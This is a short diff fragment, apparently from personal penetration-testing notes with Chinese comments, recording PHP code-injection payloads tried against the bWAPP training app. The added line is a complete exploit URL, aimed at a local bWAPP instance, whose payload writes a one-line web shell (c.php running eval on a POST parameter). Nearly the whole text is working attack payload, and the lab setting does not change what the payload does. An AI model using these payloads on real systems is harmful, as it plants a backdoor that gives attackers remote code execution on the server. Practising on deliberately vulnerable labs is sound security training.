@@ -8,3 +8,4 @@
 
 <?fputs(fopen(c.php,w),<?eval($_POST[c]);?>)?> //bwapp下失效
 fputs(fopen('c.php','w '),'<?eval($_POST[c]);?>') //bwapp下测试成功
+url: http://192.168.31.203/bWAPP/phpi.php?message=fputs(fopen('c.php','w '),'<?eval($_POST[c]);?>')
